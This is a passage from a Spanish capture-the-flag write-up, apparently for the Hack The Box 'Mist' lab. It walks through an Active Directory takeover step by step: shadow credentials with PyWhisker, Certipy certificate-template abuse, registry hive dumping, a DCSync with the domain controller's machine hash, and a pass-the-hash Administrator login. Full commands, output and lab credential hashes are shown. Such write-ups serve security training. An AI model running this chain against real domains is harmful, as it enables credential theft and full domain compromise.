proxychains4 -q nxc smb DC01.MIST.HTB -u 'svc_ca$' -H '07bb1cde74ed154fcec836bc1122bdcc'

SMB         224.0.0.1       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         224.0.0.1       445    DC01             [+] mist.htb\svc_ca$:07bb1cde74ed154fcec836bc1122bdcc
```

Revisando los privilegios de `svc_ca$` con `Bloodhound` podemos ver:

![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pasted-image-20250119115350.png)

`svc_ca$` tiene permisos sobre el usuario `svc_cabackup`.

Podemos ver la diferencia entre estos 2 usuarios al comparar su atributo `User Account Control` en `Bloodhound`:

![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pasted-image-20250119115401.png)

Yendo a la [documentación oficial de Microsoft para estos valores](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties) podemos ver que el usuario `svc_ca$`, con valor `4096`, está catalogado como `WORKSTATION_TRUST_ACCOUNT`; mientras que el usuario `svc_cabackup` tiene valor `66048` catalogado como `DONT_EXPIRE_PASSWORD`. Es decir, este último usuario es un usuario normal.

Adicionalmente, en `Bloodhound` clickeando en `Cypher -> Active Directory Certificates -> Enrollment rights on CertTemplates with OIDGroupLink` somos capaces de ver que podemos inscribir certificados gracias al certificado `ManagerAuthentication`. Revisando qué es lo que puede hacer el usuario `svc_cabackup`, podemos ver:

![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pasted-image-20250119115414.png)

Hay un camino que nos lleva al certificado `BackupSvcAuthentication`, lo cual nos debería de permitir de realizar respaldos de archivos importantes del sistema.

Por tanto, en `Bloodhound`, clickeando en `Pathfinding` en la parte superior izquierda podemos buscar cómo llegar desde `svc_cabackup` al grupo `Backup Operators`:

![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pasted-image-20250119115425.png)

Primero lo primero. Dado que teníamos la propiedad/derecho `AddKeyCredentialLink` sobre el usuario `svc_cabackup` podemos impersonar este usuario utilizando la herramienta `PyWhisker` (descargable desde [su repositorio de Github](https://github.com/ShutdownRepo/pywhisker)). Usaremos una versión levemente vieja de éste usando un viejo commit, e instalar todas las viejas dependencias en un entorno virtual:

```shell-session
 git clone https://github.com/ShutdownRepo/pywhisker.git


cd pywhisker
git checkout ec30ba5

Note: switching to 'ec30ba5'.

python3 -m venv .venv_pywhisker

source .venv_pywhisker/bin/activate

pip3 install -r requirements.txt

```

Lo ejecutamos usando el hash de `svc_ca$`:

```shell-session
proxychains4 -q python3 pywhisker.py -d mist.htb --dc-ip 192.168.100.100 -u 'svc_ca$' -H '07bb1cde74ed154fcec836bc1122bdcc' --target 'svc_cabackup' --action 'add'

[*] Searching for the target account
[*] Target user found: CN=svc_cabackup,CN=Users,DC=mist,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1c025e72-23f8-f09e-cb7a-6c31262e5e27
[*] Updating the msDS-KeyCredentialLink attribute of svc_cabackup
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: EtlyCx8f.pfx
[*] Must be used with password: ALf3t952MIixajUxA7Yf
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Obtenemos un certificado.

Tal cual dice el output, podemos usar `PKINITtools` (descargable desde [su repositorio de Github](https://github.com/dirkjanm/PKINITtools)) para usar este certificado (o podríamos usar `Rubeus` como lo hicimos anteriormente). Instalamos `PKINITtools` en un nuevo entorno virtual, copiamos el certificado generado por `PyWhisker`, junto con la contraseña generada por éste, y los usamos:

```shell-session
proxychains4 -q python3 gettgtpkinit.py -cert-pfx svc_cabackup_cert.pfx -pfx-pass ALf3t952MIixajUxA7Yf -dc-ip 192.168.100.100 MIST.HTB/svc_cabackup svc_cabackup.ccache -v

2024-10-29 22:08:15,515 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-10-29 22:08:15,548 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-10-29 22:08:32,462 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-10-29 22:08:32,462 minikerberos INFO     30a0bba4a444758cd08f8e61afefb66f722f3ec5ce520dbfee1f3403c24f2456
INFO:minikerberos:30a0bba4a444758cd08f8e61afefb66f722f3ec5ce520dbfee1f3403c24f2456
2024-10-29 22:08:32,474 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

También necesitamos guardar la key (el string que empieza con `30a0bb...` en este caso en específico).

Luego, solicitamos el hash `NT` usando `getnthash.py`:

```shell-session
KRB5CCNAME=svc_cabackup.ccache proxychains4 -q python3 getnthash.py mist.htb/svc_cabackup -key 30a0bba4a444758cd08f8e61afefb66f722f3ec5ce520dbfee1f3403c24f2456

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache

[*] Requesting ticket to self with PAC
Recovered NT Hash
c9872f1bc10bdd522c12fc2ac9041b64
```

Este hash funciona:

```shell-session
proxychains4 -q nxc smb DC01.MIST.HTB -u 'svc_cabackup' -H 'c9872f1bc10bdd522c12fc2ac9041b64'

SMB         224.0.0.1       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         224.0.0.1       445    DC01             [+] mist.htb\svc_cabackup:c9872f1bc10bdd522c12fc2ac9041b64
```

Siguiendo la secuencia de ataques recomendada por `Bloodhound` podemos usar `Certipy` para solicitar un certificado. Ejecutamos entonces:

```shell-session
proxychains4 -q certipy req -u svc_cabackup@mist.htb -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -dc-ip 192.168.100.100 -dns 192.168.100.100 -ca mist-DC01-CA -target dc01.mist.htb -template ManagerAuthentication -key-size 4096

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 62
[*] Got certificate with UPN 'svc_cabackup@mist.htb'
[*] Certificate object SID is 'S-1-5-21-1045809509-3006658589-2426055941-1135'
[*] Saved certificate and private key to 'svc_cabackup.pfx'
```

Tenemos un nuevo certificado.

Usamos `Certipy` de nuevo para crear un nuevo archivo `.kirbi`, y usamos `ticketConverter.py` de `Impacket` para convertir este archivo a uno `.ccache`:

```shell-session
proxychains4 -q certipy auth -pfx svc_cabackup.pfx -dc-ip 192.168.100.100 -kirbi

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_cabackup@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved Kirbi file to 'svc_cabackup.kirbi'
[*] Trying to retrieve NT hash for 'svc_cabackup'
[*] Got hash for 'svc_cabackup@mist.htb': aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64

impacket-ticketConverter svc_cabackup.kirbi svc_cabackup.ccache

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

Podemos usar `Certipy` nuevamente, pero esta vez usando el ticket `Kerberos` generado que a su vez usa el certificado `ManagerAuthentication` para autenticarse, cambiando el certificado que queremos solicitar que esta vez es `BackupSvcAuthentication`:

```shell-session
KRB5CCNAME=svc_cabackup.ccache proxychains4 -q certipy req -u svc_cabackup@mist.htb -k -no-pass -dc-ip 192.168.100.100 -dns 192.168.100.100 -ca mist-DC01-CA -target dc01.mist.htb -template BackupSvcAuthentication -key-size 4096

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 63
[*] Got certificate with UPN 'svc_cabackup@mist.htb'
[*] Certificate object SID is 'S-1-5-21-1045809509-3006658589-2426055941-1135'
[*] Saved certificate and private key to 'svc_cabackup.pfx'
```

Podemos usar entonces este certificado para solicitar un ticket `.kirbi` y convertirlo nuevamente:

```shell-session
proxychains4 -q certipy auth -pfx svc_cabackup.pfx -dc-ip 192.168.100.100 -kirbi

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_cabackup@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved Kirbi file to 'svc_cabackup.kirbi'
[*] Trying to retrieve NT hash for 'svc_cabackup'
[*] Got hash for 'svc_cabackup@mist.htb': aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64

impacket-ticketConverter svc_cabackup.kirbi svc_cabackup.ccache

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

En resumen, hemos solicitado el certificado `ManagerAuthentication` como el usuario `svc_cabackup` y generamos un nuevo ticket para este usuario el cual tendrá “privilegios” contenidos por este primer certificado. Luego, utilizando el primer ticket para autenticarnos (el cual nos da “permisos” para solicitar otros certificados), solicitamos el certificado `BackupSvcAuthentication`. Finalmente, usamos este segundo certificado para forjar un último ticket de `Kerberos`. Este ticket nos otorgará los “permisos” para respaldar archivos importantes del sistema.

Usando el ticket generado, creamos copias de los archivos `SAM`, `SECURITY` y `SYSTEM` usando `impacket-reg`. Notamos, de la sesión del usuario `op_sharon.mullard` de `evil-winrm`en `DC01`, que existe un directorio `C:\ps`:

```shell-session
*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents> dir C:\


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         2/24/2024  12:31 AM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----         2/24/2024   7:09 AM                ps
d-r---         2/21/2024   8:12 AM                Users
d-----         3/26/2024   9:59 AM                Windows
```

De manera que ejecutamos `impacket-reg` usando el ticket generado y guardando los archivos de respaldo en el directorio `/ps` en la máquina `DC01`:

```shell-session
KRB5CCNAME=svc_cabackup.ccache proxychains4 -q impacket-reg -k -no-pass mist.htb/svc_cabackup@dc01.mist.htb backup -o '\ps'


[*] Saved HKLM\SAM to \ps\SAM.save
[*] Saved HKLM\SYSTEM to \ps\SYSTEM.save
[*] Saved HKLM\SECURITY to \ps\SECURITY.save
```

Descargamos estos archivos usando la función `download` de `evil-winrm` desde la sesión del usuario `op_sharon.mullard` en `DC01`:

```shell-session
*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents> dir C:\ps


    Directory: C:\ps


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/24/2024   7:10 AM          18247 FireWallPortReport.csv
-a----        10/29/2024   6:53 PM          28672 SAM.save
-a----        10/29/2024   6:53 PM          36864 SECURITY.save
-a----        10/29/2024   6:53 PM       18182144 SYSTEM.save



*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents> cd C:\ps

*Evil-WinRM* PS C:\ps> download SAM.save

<SNIP>

*Evil-WinRM* PS C:\ps> download SYSTEM.save

<SNIP>

*Evil-WinRM* PS C:\ps> download SECURITY.save

<SNIP>
```

Una vez descargados, extraemos los hashes usando `secretsdump.py`:

```shell-session
impacket-secretsdump local -sam SAM.save -security SECURITY.save -system SYSTEM.save

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x47c7c97d3b39b2a20477a77d25153da5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:c68cb851aa6312ad86b532db8103025cb80e69025bd381860316ba55b056b9e1248e7817ab7fc5b23c232a5bd2aa5b8515041dc3dc47fa4e2d4c34c7db403c7edc4418cf22a1b8c2c544c464ec9fedefb1dcdbebff68c6e9a103f67f3032b68e7770b4e8e22ef05b29d002cc0e22ad4873a11ce9bac40785dcc566d38bb3e2f0d825d2f4011b566ccefdc55f098c3b76affb9a73c6212f69002655dd7b774673bf8eecaccd517e9550d88e33677ceba96f4bc273e4999bbd518673343c0a15804c43fde897c9bd579830258b630897e79d93d0c22edc2f933c7ec22c49514a2edabd5d546346ce55a0833fc2d8403780
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260
[*] DPAPI_SYSTEM
dpapi_machinekey:0xc78bf46f3d899c3922815140240178912cb2eb59
dpapi_userkey:0xc62a01b328674180712ffa554dd33d468d3ad7b8
[*] NL$KM
 0000   C4 C5 BF 4E A9 98 BD 1B  77 0E 76 A1 D3 09 4C AB   ...N....w.v...L.
 0010   B6 95 C7 55 E8 5E 4C 48  55 90 C0 26 19 85 D4 C2   ...U.^LHU..&....
 0020   67 D7 76 64 01 C8 61 B8  ED D6 D1 AF 17 5E 3D FC   g.vd..a......^=.
 0030   13 E5 4D 46 07 5F 2B 67  D3 53 B7 6F E6 B6 27 31   ..MF._+g.S.o..'1
NL$KM:c4c5bf4ea998bd1b770e76a1d3094cabb695c755e85e4c485590c0261985d4c267d7766401c861b8edd6d1af175e3dfc13e54d46075f2b67d353b76fe6b62731
[*] Cleaning up...
```

Sin embargo, este hash para el usuario `Administrator` no funciona en la máquina `DC01`.

No obstante, tenemos un hash de `$MACHINE.ACC` (o `DC01$`). Podemos revisar si este hash funciona:

```shell-session
proxychains4 -q nxc smb DC01.MIST.HTB -u 'DC01$' -H 'e768c4cf883a87ba9e96278990292260'

SMB         224.0.0.1       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         224.0.0.1       445    DC01             [+] mist.htb\DC01$:e768c4cf883a87ba9e96278990292260
```

Funciona.

Podemos entonces performar un ataque `DCSync` (basados en [este blog](https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/)) usando esta cuenta y `impacket-secretsdump`:

```shell-session
proxychains4 -q impacket-secretsdump 'DC01$'@dc01.mist.htb -hashes ':e768c4cf883a87ba9e96278990292260' -just-dc-ntlm

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::
Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::
Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::
Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::
Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::
Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::
Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::
Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::
op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::
op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::
svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::
svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::
MS01$:1108:aad3b435b51404eeaad3b435b51404ee:13000e8ca4335c49a187e8c2403a3bb7:::
svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:07bb1cde74ed154fcec836bc1122bdcc:::
[*] Cleaning up...
```

Finalmente, usamos este hash del usuario `Administrator` para loguearnos como el usuario `Administrator` en la máquina principal `DC01`:

```shell-session
proxychains4 -q evil-winrm -i 192.168.100.100 -u 'Administrator' -H 'b46782b9365344abdff1a925601e0385'

Evil-WinRM shell v3.6

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
mist\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> echo $env:COMPUTERNAME
DC01
```